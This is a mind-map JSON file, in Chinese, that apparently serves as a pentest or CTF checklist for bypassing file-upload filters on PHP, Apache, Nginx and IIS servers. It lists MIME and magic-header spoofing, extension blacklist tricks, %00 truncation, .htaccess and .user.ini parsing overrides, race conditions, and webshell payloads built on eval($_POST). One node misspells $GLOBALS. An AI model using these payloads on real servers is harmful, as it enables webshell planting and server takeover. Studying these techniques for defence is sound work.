{"nodeData":{"id":"59e1831cd1521eb3","topic":"upload","root":true,"children":[{"topic":"前端校验","id":"59e19caede81780f","direction":0},{"topic":"后端校验","id":"59e19cec45647a15","direction":1,"children":[{"topic":"MIME检测","id":"59e1a140d03d9f37","children":[{"topic":"修改Content-Type字段","id":"86061c0c65a84eff","children":[{"topic":"修改Content-Type字段","id":"86061d446dfc0e53"},{"topic":"image/png","id":"86061db11cb626e9"},{"topic":"image/gif","id":"86061dd721a9e281"}]}]},{"topic":"文件头(内容标识)检测","id":"59e1a1735b9e347d","children":[{"topic":"GIF89a","id":"8606164261894980"}]},{"topic":"上传任意后缀,判断黑白名单","id":"59e1aecdd6f7e455","children":[{"topic":"黑名单","id":"59e1b2bb7fa9a47d","children":[{"topic":"fuzz爆破(检查是否有遗漏)","id":"59e1eb3bd9399b49"},{"topic":"文件特性","id":"59e23158dc03a3f2","children":[{"topic":".php[空格]","id":"59e25f9057df020c"},{"topic":".php.==.php","id":"59e260b9df9b4270"},{"topic":".php\\.反斜杠绕过","id":"5f9883f2d04dd8d9"},{"topic":".php/.","id":"59e2614c59038642"},{"topic":"::$DATA","id":"86078019e5d3551c"}]},{"topic":".user.ini","id":"86064f49ef75cc03","children":[{"topic":"auto_prepend_file=shell.png","id":"8608b184688c8324"}]},{"topic":".htaccess","id":"860650f8749e1569","children":[{"topic":"AddType application/x-httpd-php .png","id":"8608b4f751ce03e4","children":[{"topic":"png文件全部被解析为php","id":"860932b557d9ef8c"}]},{"topic":"AddHandler php5-script .gif","id":"86091301f91d3980","children":[{"topic":"gif文件全部被解析为php","id":"8609320547079803"}]},{"topic":"SetHandler application/x-httpd-php","id":"860914fcf01e4eb1","children":[{"topic":"所有文件被解析为php","id":"86093b40e84f20f1"}]}]},{"topic":"陌生后缀绕过(apache解析漏洞)","id":"8609ae8ecb9cc12a","children":[{"topic":".php.7z","id":"8609b1055711d554"}]},{"topic":"1.php;jpg","id":"8609b6124eead1ca"}]},{"topic":"白名单","id":"59e1b2ecf2154f96","children":[{"topic":"%00截断","id":"860643f0ef3f57a4"},{"topic":"错误配置，AddHandler application/x-httpd-php .php，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀","id":"8609a578b6b87ad2","children":[{"topic":".php.jpg","id":"8609b99ed6bd8f69"}]}]}]},{"topic":"后缀拼接","id":"59e1a1a057e14d78","children":[{"topic":"尝试%00截断(PHP 版本 < 5.3.4)","id":"59e209a54a3645a2","children":[{"topic":"magic_quotes_gpc=off","id":"860795e5dd2ef998"}]},{"topic":"长度溢出","id":"59e20a685f710ed8"}]},{"topic":"查看web服务器,尝试上传中间件配置文件","id":"59e2462a5f5d7b78","children":[{"topic":"apache","id":"59e24a80da797212","children":[{"topic":".htaccess","id":"59e2587e51d2e873"}]},{"topic":"nginx","id":"59e24ba2d60193c6","children":[{"topic":".user.ini","id":"59e25b19d06fb0bf"}]},{"topic":"IIS6.0漏洞","id":"864a1c48b9a739ed","children":[{"topic":".asp .asa .cer，则目录下的所有文件都会被作为ASP","id":"864a1ebb12e12685","children":[{"topic":"shell.asa会被作为asp文件执行。","id":"864a2231a73f7318"}]},{"topic":"文件解析","id":"864a23daa6663427","children":[{"topic":"文件名中分号不被解析，例如：.asp; .asa; .cer;","id":"864a24dc2e95133f"}]}]}]},{"topic":"对比上传前后的图片,是否进行了二次渲染","id":"59e24d106e6828e4"},{"topic":"多文件上传","id":"86080a7e7ba837bb","children":[{"topic":"第一份上传正常文件,第二份上传木马文件","id":"86080c3bec002e67"}]}]},{"topic":"条件竞争","id":"5c80159fe62dd31d","children":[{"topic":"<?php fputs(fopen(\"shell.php\", \"w\"), '<?php @eval($_POST[\"shell\"]); ?>'); ?>","id":"5f5d76234b80bdea"}],"expanded":true},{"topic":"php代码检测bypass","id":"8607c1411cdf1d48","children":[{"topic":"过滤<?","id":"8607e303e5fcb1a8","children":[{"topic":"上传phtml,用script标签","id":"8607e5c9626e6902","children":[{"topic":"<script language=\"php\">@eval($_POST[1]);</script>","id":"8607ea8a04298272"}]}]},{"topic":"其他短标签","id":"8607e3486c5a324a","children":[{"topic":"<?=","id":"860812a6ecb942b6"},{"topic":"<% PHP info()%>","id":"86089814f88f5180","children":[{"topic":"需开启 asp_tags","id":"86089db143408372"}]},{"topic":"<?phpinfo();?>","id":"8608a56d51c75e94","children":[{"topic":"<!-- 需开启 short_open_tag -->","id":"8608a691db2bc893"}]}]},{"topic":"[]过滤","id":"8607e3924f6be66d","children":[{"topic":"{}替代","id":"86081d0cf31613a7"}]},{"topic":"[]{}过滤","id":"86081e69fe8cdaa2","children":[{"topic":"尝试使用include等,转而采用包含日志","id":"86082068ff2ff525"}]},{"topic":"$","id":"86084d73821b3227","children":[{"topic":"不能上传马了,试试用反引号加system命令执行","id":"86084ea4f2ef3e7f","children":[]}]},{"topic":"_","id":"86088dc19a476eb6","children":[{"topic":"$GLOABLAS传参","id":"86088ebce2c884d6"}]}]}]},"linkData":{},"direction":1}